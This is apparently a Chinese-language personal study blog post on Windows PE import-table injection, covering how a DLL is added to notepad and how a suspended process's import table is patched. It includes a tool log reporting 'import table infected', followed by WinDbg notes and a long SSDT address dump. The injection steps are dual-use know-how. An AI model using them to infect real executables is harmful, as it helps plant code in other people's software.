<p>也因此这篇文章注定是随着我的学习不断更新的。</p>
<h2 id="1-使用拓展最后一个节区进行注入已经写好的的DLL"><a href="#1-使用拓展最后一个节区进行注入已经写好的的DLL" class="headerlink" title="1.使用拓展最后一个节区进行注入已经写好的的DLL"></a>1.使用拓展最后一个节区进行注入已经写好的的DLL</h2><p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-22_23-28-12.jpg" alt="Snipaste_2021-09-22_23-28-12"></p>
<p>这个在运行被注入的 notepad 的过程中，DLL 中的 Msg 并不会运行，只是通过 dllenterpoint 函数执行了 dllmain ，后者调用了 msgbox，弹出一个msgbox 窗体。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-23_01-08-25.jpg" alt="Snipaste_2021-09-23_01-08-25"></p>
<p>text 中的 0x7800 -&gt; 0x7748 也就是肯定没有 7800 那么多数据，因此后面的可以写入的就是 0x7800-0x7748。不过不够我要的 IIT 就是了。<br>分析给的 notepad 可以知道 ，为了不影响程序的正常运行，我们可以把 IIT结构修改并转移到别的地方存储，IIT 存储的关键就只有 OriginalFirstThunk,FirstThunk,Name。我们只要把 optional_header 中的 Data Directory 中的 Immport Directory 指向我们自己的数据即可，没有数据就创造区域。没有空间就修改 section_header 中的 raw size,最后写到最末尾。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-23_01-24-02.jpg" alt="Snipaste_2021-09-23_01-24-02"></p>
<p>由于程序启用了绑定输入。程序在加载的时候会以为dll的函数加载到了正确的虚拟地址中，然而我自己的dll似乎不能延迟绑定（似乎也可以的样子，研究一波）</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-23_01-27-08.jpg" alt="Snipaste_2021-09-23_01-27-08"></p>
<p>我们可以覆盖 0x1B0 的地址和大小为零，顺带也可以删掉 0x250 0xD0长度的{TimeDateStamp:DWORD;offsetModuleName:WORD;NumberOfModuleForwarderRefs:WORD}结构体数组</p>
<p>还有可能要注意的一点就是 FirstTrunk 也要指向 IMAGE_IMPORT_BY_NAME</p>
<h2 id="2-进程创建期间修改PE输入表"><a href="#2-进程创建期间修改PE输入表" class="headerlink" title="2.进程创建期间修改PE输入表"></a>2.进程创建期间修改PE输入表</h2><p>以挂起进程创建这个进程 dwCreationFlag<br>搜索虚拟内存中的镜像地址<br>创建新节区，在虚拟内存中直接分配就好了<br>修改 OptionalHeader 中的 ImportDictionary 指向自己的新地址<br>移植 IID 到新节，新DLL所需要 的 INT，IAT，IMAGE_IMPORT_BY_NAME<br>再有删掉输入绑定</p>
<p>可以通过项目的日志看的更清楚</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Path <span class="token operator">=</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ImageBase <span class="token operator">=</span> 0x00400000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PE头读取成功<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 当前导入表信息 VA <span class="token operator">=</span> 0x000064CC Size <span class="token operator">=</span> 0x28
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> dwOldIIDCnt <span class="token operator">=</span> <span class="token number">2</span>  Size <span class="token operator">=</span> 0x28
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> dwNewIIDCnt <span class="token operator">=</span> <span class="token number">3</span>  Size <span class="token operator">=</span> 0x3C
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 导入表所在节  .rdata  RawOffset <span class="token operator">=</span> 0x6000 Size <span class="token operator">=</span> 0x1000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 新节添加完毕<span class="token operator">!</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NewSection VA <span class="token operator">=</span> 0x410000 VirtualSize <span class="token operator">=</span> 0x1000 RawSize <span class="token operator">=</span> 0x1000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 原导入表IID结构保存完毕.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 新导入表IID子结构构造完毕.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 新IID成员占用的空间大小 <span class="token operator">=</span> 0x22
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 新IID填充完毕.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PE头更新完毕.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 开始更新内存中的PE数据.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 准备写入PE头: StartAddress <span class="token operator">=</span> 0x00400000 Size <span class="token operator">=</span> 0x1000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PE头写入完毕.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 准备写入IID信息: StartAddress <span class="token operator">=</span> 0x0041003C Size <span class="token operator">=</span> 0x1000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 新IID项的子结构写入完毕. Add <span class="token operator">=</span> 0x1003C Size <span class="token operator">=</span> 0x22
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 新导入表整体写入完毕. Offset <span class="token operator">=</span> 0x1003C Size <span class="token operator">=</span> 0x22
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 导入表感染完毕.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-24_10-51-19.jpg" alt="Snipaste_2021-09-24_10-51-19"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-09-24_10-51-29.jpg" alt="Snipaste_2021-09-24_10-51-29"></p>
<p>我个人观点，本项目的重点在于解析 IMAGE,还有一些自己不熟悉的 WINAPI，并没有什么非常新颖的思路，比起第一个就只是把 PE 创建时 suspend 了，还有直接分配内存给自己注入 IID，后面就和我自己的做法一样了。作者写出这个脚本还是很强的。</p>
<p>自己水平有限，还不能比较好的写出这种脚本，下次一定。</p>
<h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><h1 id="win-内核"><a href="#win-内核" class="headerlink" title="win 内核"></a>win 内核</h1><h2 id="win-内核数据结构"><a href="#win-内核数据结构" class="headerlink" title="win 内核数据结构"></a>win 内核数据结构</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tagSERVICE_DESCRIPTOR_TABLE</span> <span class="token punctuation">&#123;</span>
    SYSTEM_SERVICE_TABLE nt<span class="token punctuation">;</span> <span class="token comment">//effectively a pointer to Service Dispatch Table (SSDT) itself</span>
    SYSTEM_SERVICE_TABLE win32k<span class="token punctuation">;</span>
    SYSTEM_SERVICE_TABLE sst3<span class="token punctuation">;</span> <span class="token comment">//pointer to a memory address that contains how many routines are defined in the table</span>
    SYSTEM_SERVICE_TABLE sst4<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> SERVICE_DESCRIPTOR_TABLE<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lkd<span class="token operator">></span> dps nt<span class="token operator">!</span>keservicedescriptortable l4
fffff802<span class="token variable"><span class="token variable">`</span>532018c0  fffff802<span class="token variable">`</span></span>524c8340 nt<span class="token operator">!</span>KiServiceTable
fffff802<span class="token variable"><span class="token variable">`</span>532018c8  00000000<span class="token variable">`</span></span>00000000
fffff802<span class="token variable"><span class="token variable">`</span>532018d0  00000000<span class="token variable">`</span></span>000001d7
fffff802<span class="token variable"><span class="token variable">`</span>532018d8  fffff802<span class="token variable">`</span></span>524c8aa0 nt<span class="token operator">!</span>KiArgumentTable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="SSDT-system-service-descriptor-table"><a href="#SSDT-system-service-descriptor-table" class="headerlink" title="SSDT (system service descriptor table)"></a>SSDT (system service descriptor table)</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lkd&gt; .foreach &#x2F;ps 1 &#x2F;pS 1 ( offset &#123;dd &#x2F;c 1 nt!KiServiceTable L poi(nt!KeServiceDescriptorTable+10)&#125;)&#123; r $t0 &#x3D; ( offset &gt;&gt;&gt; 4) + nt!KiServiceTable; .printf &quot;%p - %y\n&quot;, $t0, $t0 &#125;
fffff80252739f60 - nt!NtAccessCheck (fffff802&#96;52739f60)
fffff80252745450 - nt!NtWorkerFactoryWorkerReady (fffff802&#96;52745450)
fffff80252b06660 - nt!NtAcceptConnectPort (fffff802&#96;52b06660)
fffff80252cd3cd0 - nt!NtMapUserPhysicalPagesScatter (fffff802&#96;52cd3cd0)
fffff802529f75b0 - nt!NtWaitForSingleObject (fffff802&#96;529f75b0)
fffff802527fab00 - nt!NtCallbackReturn (fffff802&#96;527fab00)
fffff80252a8bae0 - nt!NtReadFile (fffff802&#96;52a8bae0)
fffff80252a745a0 - nt!NtDeviceIoControlFile (fffff802&#96;52a745a0)
fffff80252a8aeb0 - nt!NtWriteFile (fffff802&#96;52a8aeb0)
fffff80252ad67b0 - nt!NtRemoveIoCompletion (fffff802&#96;52ad67b0)
fffff80252ad5060 - nt!NtReleaseSemaphore (fffff802&#96;52ad5060)
fffff80252a89230 - nt!NtReplyWaitReceivePort (fffff802&#96;52a89230)
fffff80252a2dab0 - nt!NtReplyPort (fffff802&#96;52a2dab0)
fffff80252a73480 - nt!NtSetInformationThread (fffff802&#96;52a73480)
fffff80252a72b70 - nt!NtSetEvent (fffff802&#96;52a72b70)
fffff802529f72e0 - nt!NtClose (fffff802&#96;529f72e0)
fffff80252a5f310 - nt!NtQueryObject (fffff802&#96;52a5f310)
fffff80252a77a00 - nt!NtQueryInformationFile (fffff802&#96;52a77a00)
fffff80252ae2a50 - nt!NtOpenKey (fffff802&#96;52ae2a50)
fffff802529e8e00 - nt!NtEnumerateValueKey (fffff802&#96;529e8e00)
fffff80252a02080 - nt!NtFindAtom (fffff802&#96;52a02080)
fffff80252ab4940 - nt!NtQueryDefaultLocale (fffff802&#96;52ab4940)
fffff80252a94d20 - nt!NtQueryKey (fffff802&#96;52a94d20)
fffff80252a953c0 - nt!NtQueryValueKey (fffff802&#96;52a953c0)
fffff80252ab60e0 - nt!NtAllocateVirtualMemory (fffff802&#96;52ab60e0)
fffff80252a61850 - nt!NtQueryInformationProcess (fffff802&#96;52a61850)
fffff80252ae3130 - nt!NtWaitForMultipleObjects32 (fffff802&#96;52ae3130)
fffff80252aebe60 - nt!NtWriteFileGather (fffff802&#96;52aebe60)
fffff80252a9fb80 - nt!NtSetInformationProcess (fffff802&#96;52a9fb80)
fffff80252a519a0 - nt!NtCreateKey (fffff802&#96;52a519a0)
fffff802529f8ad0 - nt!NtFreeVirtualMemory (fffff802&#96;529f8ad0)
fffff80252cbeda0 - nt!NtImpersonateClientOfPort (fffff802&#96;52cbeda0)
fffff80252a72a60 - nt!NtReleaseMutant (fffff802&#96;52a72a60)
fffff80252a7e5a0 - nt!NtQueryInformationToken (fffff802&#96;52a7e5a0)
fffff80252aed0a0 - nt!NtRequestWaitReplyPort (fffff802&#96;52aed0a0)
fffff802529ff3b0 - nt!NtQueryVirtualMemory (fffff802&#96;529ff3b0)
fffff80252a662b0 - nt!NtOpenThreadToken (fffff802&#96;52a662b0)
fffff80252a882a0 - nt!NtQueryInformationThread (fffff802&#96;52a882a0)
fffff80252ad1fc0 - nt!NtOpenProcess (fffff802&#96;52ad1fc0)
fffff8025268fda0 - nt!NtSetInformationFile (fffff802&#96;5268fda0)
fffff802529fe690 - nt!NtMapViewOfSection (fffff802&#96;529fe690)
fffff80252a26bf0 - nt!NtAccessCheckAndAuditAlarm (fffff802&#96;52a26bf0)
fffff80252afc470 - nt!NtUnmapViewOfSection (fffff802&#96;52afc470)
fffff80252a89250 - nt!NtReplyWaitReceivePortEx (fffff802&#96;52a89250)
fffff80252ab3900 - nt!NtTerminateProcess (fffff802&#96;52ab3900)
fffff80252d4c1c0 - nt!NtSetEventBoostPriority (fffff802&#96;52d4c1c0)
fffff80252aeb850 - nt!NtReadFileScatter (fffff802&#96;52aeb850)
fffff80252a662d0 - nt!NtOpenThreadTokenEx (fffff802&#96;52a662d0)
fffff80252a66a90 - nt!NtOpenProcessTokenEx (fffff802&#96;52a66a90)
fffff80252aae9b0 - nt!NtQueryPerformanceCounter (fffff802&#96;52aae9b0)
fffff80252a72420 - nt!NtEnumerateKey (fffff802&#96;52a72420)
fffff80252a155c0 - nt!NtOpenFile (fffff802&#96;52a155c0)
fffff80252a96c40 - nt!NtDelayExecution (fffff802&#96;52a96c40)
fffff80252af2300 - nt!NtQueryDirectoryFile (fffff802&#96;52af2300)
fffff80252a8e9c0 - nt!NtQuerySystemInformation (fffff802&#96;52a8e9c0)
fffff80252ae2120 - nt!NtOpenSection (fffff802&#96;52ae2120)
fffff80252d4bfb0 - nt!NtQueryTimer (fffff802&#96;52d4bfb0)
fffff80252ae24e0 - nt!NtFsControlFile (fffff802&#96;52ae24e0)
fffff80252b010c0 - nt!NtWriteVirtualMemory (fffff802&#96;52b010c0)
fffff80252af0aa0 - nt!NtCloseObjectAuditAlarm (fffff802&#96;52af0aa0)
fffff802529e8200 - nt!NtDuplicateObject (fffff802&#96;529e8200)
fffff80252a16450 - nt!NtQueryAttributesFile (fffff802&#96;52a16450)
fffff80252adad70 - nt!NtClearEvent (fffff802&#96;52adad70)
fffff802529ea650 - nt!NtReadVirtualMemory (fffff802&#96;529ea650)
fffff80252ae7c50 - nt!NtOpenEvent (fffff802&#96;52ae7c50)
fffff80252a180f0 - nt!NtAdjustPrivilegesToken (fffff802&#96;52a180f0)
fffff80252a2b540 - nt!NtDuplicateToken (fffff802&#96;52a2b540)
fffff802527f78f0 - nt!NtContinue (fffff802&#96;527f78f0)
fffff80252b7c0e0 - nt!NtQueryDefaultUILanguage (fffff802&#96;52b7c0e0)
fffff80252ab3ac0 - nt!NtQueueApcThread (fffff802&#96;52ab3ac0)
fffff802526f1480 - nt!NtYieldExecution (fffff802&#96;526f1480)
fffff80252d53990 - nt!NtAddAtom (fffff802&#96;52d53990)
fffff80252a78db0 - nt!NtCreateEvent (fffff802&#96;52a78db0)
fffff80252a8e3a0 - nt!NtQueryVolumeInformationFile (fffff802&#96;52a8e3a0)
fffff802529fa5f0 - nt!NtCreateSection (fffff802&#96;529fa5f0)
fffff80252ae7810 - nt!NtFlushBuffersFile (fffff802&#96;52ae7810)
fffff80252a60f60 - nt!NtApphelpCacheControl (fffff802&#96;52a60f60)
fffff80252d03ed0 - nt!NtCreateProcessEx (fffff802&#96;52d03ed0)
fffff80252d03f70 - nt!NtCreateThread (fffff802&#96;52d03f70)
fffff80252a57660 - nt!NtIsProcessInJob (fffff802&#96;52a57660)
fffff80252a96600 - nt!NtProtectVirtualMemory (fffff802&#96;52a96600)
fffff80252af9150 - nt!NtQuerySection (fffff802&#96;52af9150)
fffff80252ab2940 - nt!NtResumeThread (fffff802&#96;52ab2940)
fffff80252ab3270 - nt!NtTerminateThread (fffff802&#96;52ab3270)
fffff80252cbeea0 - nt!NtReadRequestData (fffff802&#96;52cbeea0)
fffff80252a15630 - nt!NtCreateFile (fffff802&#96;52a15630)
fffff80252afda30 - nt!NtQueryEvent (fffff802&#96;52afda30)
fffff80252cbf020 - nt!NtWriteRequestData (fffff802&#96;52cbf020)
fffff80252ae2050 - nt!NtOpenDirectoryObject (fffff802&#96;52ae2050)
fffff80252a26b40 - nt!NtAccessCheckByTypeAndAuditAlarm (fffff802&#96;52a26b40)
fffff80252d48a30 - nt!NtQuerySystemTime (fffff802&#96;52d48a30)
fffff80252a6f1e0 - nt!NtWaitForMultipleObjects (fffff802&#96;52a6f1e0)
fffff80252ae10c0 - nt!NtSetInformationObject (fffff802&#96;52ae10c0)
fffff80252aee0f0 - nt!NtCancelIoFile (fffff802&#96;52aee0f0)
fffff8025266c790 - nt!NtTraceEvent (fffff802&#96;5266c790)
fffff80252a495f0 - nt!NtPowerInformation (fffff802&#96;52a495f0)
fffff802529e3650 - nt!NtSetValueKey (fffff802&#96;529e3650)
fffff802526ffc70 - nt!NtCancelTimer (fffff802&#96;526ffc70)
fffff80252776b90 - nt!NtSetTimer (fffff802&#96;52776b90)
fffff80252744e80 - nt!NtAccessCheckByType (fffff802&#96;52744e80)
fffff802529909a0 - nt!NtAccessCheckByTypeResultList (fffff802&#96;529909a0)
fffff80252d1e060 - nt!NtAccessCheckByTypeResultListAndAuditAlarm (fffff802&#96;52d1e060)
fffff80252d1e110 - nt!NtAccessCheckByTypeResultListAndAuditAlarmByHandle (fffff802&#96;52d1e110)
fffff80252d53ac0 - nt!NtAcquireCrossVmMutant (fffff802&#96;52d53ac0)
fffff80252b1e8a0 - nt!NtAcquireProcessActivityReference (fffff802&#96;52b1e8a0)
fffff80252aefc50 - nt!NtAddAtomEx (fffff802&#96;52aefc50)
fffff80252d4fd30 - nt!NtAddBootEntry (fffff802&#96;52d4fd30)
fffff80252d4fd60 - nt!NtAddDriverEntry (fffff802&#96;52d4fd60)
fffff80252a30c60 - nt!NtAdjustGroupsToken (fffff802&#96;52a30c60)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252d094e0 - nt!NtAlertResumeThread (fffff802&#96;52d094e0)
fffff80252d09600 - nt!NtAlertThread (fffff802&#96;52d09600)
fffff80252a66150 - nt!NtAlertThreadByThreadId (fffff802&#96;52a66150)
fffff80252ada2d0 - nt!NtAllocateLocallyUniqueId (fffff802&#96;52ada2d0)
fffff80252b01750 - nt!NtAllocateReserveObject (fffff802&#96;52b01750)
fffff80252cd34f0 - nt!NtAllocateUserPhysicalPages (fffff802&#96;52cd34f0)
fffff80252cd3510 - nt!NtAllocateUserPhysicalPagesEx (fffff802&#96;52cd3510)
fffff80252b07730 - nt!NtAllocateUuids (fffff802&#96;52b07730)
fffff80252ab6340 - nt!NtAllocateVirtualMemoryEx (fffff802&#96;52ab6340)
fffff80252a2a050 - nt!NtAlpcAcceptConnectPort (fffff802&#96;52a2a050)
fffff80252b0e5b0 - nt!NtAlpcCancelMessage (fffff802&#96;52b0e5b0)
fffff80252a28560 - nt!NtAlpcConnectPort (fffff802&#96;52a28560)
fffff80252a285e0 - nt!NtAlpcConnectPortEx (fffff802&#96;52a285e0)
fffff80252af9a70 - nt!NtAlpcCreatePort (fffff802&#96;52af9a70)
fffff80252a0d140 - nt!NtAlpcCreatePortSection (fffff802&#96;52a0d140)
fffff80252ae2550 - nt!NtAlpcCreateResourceReserve (fffff802&#96;52ae2550)
fffff80252a0fde0 - nt!NtAlpcCreateSectionView (fffff802&#96;52a0fde0)
fffff80252adf250 - nt!NtAlpcCreateSecurityContext (fffff802&#96;52adf250)
fffff80252a48b30 - nt!NtAlpcDeletePortSection (fffff802&#96;52a48b30)
fffff80252cc01a0 - nt!NtAlpcDeleteResourceReserve (fffff802&#96;52cc01a0)
fffff80252a48a00 - nt!NtAlpcDeleteSectionView (fffff802&#96;52a48a00)
fffff80252a89990 - nt!NtAlpcDeleteSecurityContext (fffff802&#96;52a89990)
fffff80252afb310 - nt!NtAlpcDisconnectPort (fffff802&#96;52afb310)
fffff80252cbf2f0 - nt!NtAlpcImpersonateClientContainerOfPort (fffff802&#96;52cbf2f0)
fffff80252a878a0 - nt!NtAlpcImpersonateClientOfPort (fffff802&#96;52a878a0)
fffff80252a2c280 - nt!NtAlpcOpenSenderProcess (fffff802&#96;52a2c280)
fffff80252afb910 - nt!NtAlpcOpenSenderThread (fffff802&#96;52afb910)
fffff80252ad4a70 - nt!NtAlpcQueryInformation (fffff802&#96;52ad4a70)
fffff80252a257c0 - nt!NtAlpcQueryInformationMessage (fffff802&#96;52a257c0)
fffff80252cbf530 - nt!NtAlpcRevokeSecurityContext (fffff802&#96;52cbf530)
fffff80252a82200 - nt!NtAlpcSendWaitReceivePort (fffff802&#96;52a82200)
fffff80252af3c50 - nt!NtAlpcSetInformation (fffff802&#96;52af3c50)
fffff80252b0ac60 - nt!NtAreMappedFilesTheSame (fffff802&#96;52b0ac60)
fffff80252a57960 - nt!NtAssignProcessToJobObject (fffff802&#96;52a57960)
fffff8025270ee70 - nt!NtAssociateWaitCompletionPacket (fffff802&#96;5270ee70)
fffff802527ffe30 - nt!NtCallEnclave (fffff802&#96;527ffe30)
fffff80252aee2a0 - nt!NtCancelIoFileEx (fffff802&#96;52aee2a0)
fffff80252c919b0 - nt!NtCancelSynchronousIoFile (fffff802&#96;52c919b0)
fffff8025275f630 - nt!NtCancelTimer2 (fffff802&#96;5275f630)
fffff802526d56b0 - nt!NtCancelWaitCompletionPacket (fffff802&#96;526d56b0)
fffff802527ccfa0 - nt!NtCommitComplete (fffff802&#96;527ccfa0)
fffff802527ccfc0 - nt!NtCommitEnlistment (fffff802&#96;527ccfc0)
fffff80252a52c60 - nt!NtCommitRegistryTransaction (fffff802&#96;52a52c60)
fffff802527ccfe0 - nt!NtCommitTransaction (fffff802&#96;527ccfe0)
fffff80252c64d20 - nt!NtCompactKeys (fffff802&#96;52c64d20)
fffff80252aedb70 - nt!NtCompareObjects (fffff802&#96;52aedb70)
fffff80252b0a910 - nt!NtCompareSigningLevels (fffff802&#96;52b0a910)
fffff80252ae8020 - nt!NtCompareTokens (fffff802&#96;52ae8020)
fffff80252b0a310 - nt!ArbPreprocessEntry (fffff802&#96;52b0a310)
fffff80252c65000 - nt!NtCompressKey (fffff802&#96;52c65000)
fffff80252a2e3c0 - nt!NtConnectPort (fffff802&#96;52a2e3c0)
fffff802527f7900 - nt!NtContinueEx (fffff802&#96;527f7900)
fffff80252d577d0 - nt!NtConvertBetweenAuxiliaryCounterAndPerformanceCounter (fffff802&#96;52d577d0)
fffff80252d4c110 - nt!NtCreateCrossVmEvent (fffff802&#96;52d4c110)
fffff80252d53b90 - nt!NtCreateCrossVmMutant (fffff802&#96;52d53b90)
fffff80252c82df0 - nt!NtCreateDebugObject (fffff802&#96;52c82df0)
fffff80252af2060 - nt!NtCreateDirectoryObject (fffff802&#96;52af2060)
fffff80252af2040 - nt!NtCreateDirectoryObjectEx (fffff802&#96;52af2040)
fffff80252cd0a50 - nt!NtCreateEnclave (fffff802&#96;52cd0a50)
fffff802527cd000 - nt!NtCreateEnlistment (fffff802&#96;527cd000)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252b7c0b0 - nt!NtCreateIRTimer (fffff802&#96;52b7c0b0)
fffff80252aa6930 - nt!NtCreateIoCompletion (fffff802&#96;52aa6930)
fffff80252a56b20 - nt!NtCreateJobObject (fffff802&#96;52a56b20)
fffff80252b13470 - nt!ArbAddReserved (fffff802&#96;52b13470)
fffff80252b56f30 - nt!NtCreateKeyTransacted (fffff802&#96;52b56f30)
fffff80252bb2660 - nt!NtCreateKeyedEvent (fffff802&#96;52bb2660)
fffff80252aba860 - nt!NtCreateLowBoxToken (fffff802&#96;52aba860)
fffff802529cf5b0 - nt!NtCreateMailslotFile (fffff802&#96;529cf5b0)
fffff80252acad90 - nt!NtCreateMutant (fffff802&#96;52acad90)
fffff80252afdea0 - nt!NtCreateNamedPipeFile (fffff802&#96;52afdea0)
fffff80252ba1cb0 - nt!NtCreatePagingFile (fffff802&#96;52ba1cb0)
fffff80252d09cd0 - nt!NtCreatePartition (fffff802&#96;52d09cd0)
fffff80252b600a0 - nt!NtCreatePort (fffff802&#96;52b600a0)
fffff80252af3680 - nt!NtCreatePrivateNamespace (fffff802&#96;52af3680)
fffff80252d03e40 - nt!NtCreateProcess (fffff802&#96;52d03e40)
fffff80252d57900 - nt!NtCreateProfile (fffff802&#96;52d57900)
fffff80252d579e0 - nt!NtCreateProfileEx (fffff802&#96;52d579e0)
fffff80252b0b700 - nt!NtCreateRegistryTransaction (fffff802&#96;52b0b700)
fffff802527cd020 - nt!NtCreateResourceManager (fffff802&#96;527cd020)
fffff80252cc4720 - nt!NtCreateSectionEx (fffff802&#96;52cc4720)
fffff80252aafd40 - nt!NtCreateSemaphore (fffff802&#96;52aafd40)
fffff80252afae50 - nt!NtCreateSymbolicLinkObject (fffff802&#96;52afae50)
fffff80252ab0fb0 - nt!NtCreateThreadEx (fffff802&#96;52ab0fb0)
fffff80252aabb40 - nt!NtCreateTimer (fffff802&#96;52aabb40)
fffff80252a0e550 - nt!NtCreateTimer2 (fffff802&#96;52a0e550)
fffff80252d1f5f0 - nt!NtCreateToken (fffff802&#96;52d1f5f0)
fffff80252a2f3e0 - nt!NtCreateTokenEx (fffff802&#96;52a2f3e0)
fffff802527cd040 - nt!NtCreateTransaction (fffff802&#96;527cd040)
fffff802527cd060 - nt!NtCreateTransactionManager (fffff802&#96;527cd060)
fffff80252a143e0 - nt!NtCreateUserProcess (fffff802&#96;52a143e0)
fffff80252ae32a0 - nt!NtCreateWaitCompletionPacket (fffff802&#96;52ae32a0)
fffff80252b7b8f0 - nt!NtCreateWaitablePort (fffff802&#96;52b7b8f0)
fffff80252a25da0 - nt!NtCreateWnfStateName (fffff802&#96;52a25da0)
fffff80252a0cd70 - nt!NtCreateWorkerFactory (fffff802&#96;52a0cd70)
fffff80252c82ff0 - nt!NtDebugActiveProcess (fffff802&#96;52c82ff0)
fffff80252c831c0 - nt!NtDebugContinue (fffff802&#96;52c831c0)
fffff80252af1380 - nt!NtDeleteAtom (fffff802&#96;52af1380)
fffff80252d4fd90 - nt!NtDeleteBootEntry (fffff802&#96;52d4fd90)
fffff80252d4ff20 - nt!NtDeleteDriverEntry (fffff802&#96;52d4ff20)
fffff80252b69e40 - nt!NtDeleteFile (fffff802&#96;52b69e40)
fffff80252a43680 - nt!NtDeleteKey (fffff802&#96;52a43680)
fffff80252b22270 - nt!NtDeleteObjectAuditAlarm (fffff802&#96;52b22270)
fffff80252cdc320 - nt!NtDeletePrivateNamespace (fffff802&#96;52cdc320)
fffff802529dd640 - nt!NtDeleteValueKey (fffff802&#96;529dd640)
fffff80252bba370 - nt!NtDeleteWnfStateData (fffff802&#96;52bba370)
fffff80252a20c30 - nt!NtDeleteWnfStateName (fffff802&#96;52a20c30)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252b6a3c0 - nt!NtDisableLastKnownGood (fffff802&#96;52b6a3c0)
fffff80252d49220 - nt!NtDisplayString (fffff802&#96;52d49220)
fffff802529ad330 - nt!NtDrawText (fffff802&#96;529ad330)
fffff80252b695e0 - nt!NtEnableLastKnownGood (fffff802&#96;52b695e0)
fffff80252d500b0 - nt!NtEnumerateBootEntries (fffff802&#96;52d500b0)
fffff80252d50700 - nt!NtEnumerateDriverEntries (fffff802&#96;52d50700)
fffff80252d50bc0 - nt!NtEnumerateSystemEnvironmentValuesEx (fffff802&#96;52d50bc0)
fffff802527cd080 - nt!NtEnumerateTransactionObject (fffff802&#96;527cd080)
fffff80252b07a00 - nt!NtExtendSection (fffff802&#96;52b07a00)
fffff80252d20ae0 - nt!NtFilterBootOption (fffff802&#96;52d20ae0)
fffff80252a31cf0 - nt!NtFilterToken (fffff802&#96;52a31cf0)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252ae7840 - nt!NtFlushBuffersFileEx (fffff802&#96;52ae7840)
fffff80252bbc610 - nt!NtFlushInstallUILanguage (fffff802&#96;52bbc610)
fffff80252b0a310 - nt!ArbPreprocessEntry (fffff802&#96;52b0a310)
fffff80252b02090 - nt!NtFlushKey (fffff802&#96;52b02090)
fffff802526fcee0 - nt!NtFlushProcessWriteBuffers (fffff802&#96;526fcee0)
fffff80252aff030 - nt!NtFlushVirtualMemory (fffff802&#96;52aff030)
fffff80252b0a310 - nt!ArbPreprocessEntry (fffff802&#96;52b0a310)
fffff80252cd3530 - nt!NtFreeUserPhysicalPages (fffff802&#96;52cd3530)
fffff80252c651e0 - nt!NtFreezeRegistry (fffff802&#96;52c651e0)
fffff802527cd0a0 - nt!NtFreezeTransactions (fffff802&#96;527cd0a0)
fffff80252aef050 - nt!NtGetCachedSigningLevel (fffff802&#96;52aef050)
fffff80252a21440 - nt!NtGetCompleteWnfStateSubscription (fffff802&#96;52a21440)
fffff80252b0b580 - nt!NtGetContextThread (fffff802&#96;52b0b580)
fffff80252d046f0 - nt!NtGetCurrentProcessorNumber (fffff802&#96;52d046f0)
fffff80252d04750 - nt!NtGetCurrentProcessorNumberEx (fffff802&#96;52d04750)
fffff80252ced290 - nt!NtGetDevicePowerState (fffff802&#96;52ced290)
fffff80252aed1b0 - nt!NtGetMUIRegistryInfo (fffff802&#96;52aed1b0)
fffff80252b77c80 - nt!NtGetNextProcess (fffff802&#96;52b77c80)
fffff80252b02a10 - nt!NtGetNextThread (fffff802&#96;52b02a10)
fffff80252afe900 - nt!NtGetNlsSectionPtr (fffff802&#96;52afe900)
fffff802527cd0c0 - nt!NtGetNotificationResourceManager (fffff802&#96;527cd0c0)
fffff80252636e30 - nt!NtGetWriteWatch (fffff802&#96;52636e30)
fffff80252a30630 - nt!NtImpersonateAnonymousToken (fffff802&#96;52a30630)
fffff80252aca470 - nt!NtImpersonateThread (fffff802&#96;52aca470)
fffff80252cd0ea0 - nt!NtInitializeEnclave (fffff802&#96;52cd0ea0)
fffff80252a5c910 - nt!NtInitializeNlsFiles (fffff802&#96;52a5c910)
fffff80252b7a8d0 - nt!NtInitializeRegistry (fffff802&#96;52b7a8d0)
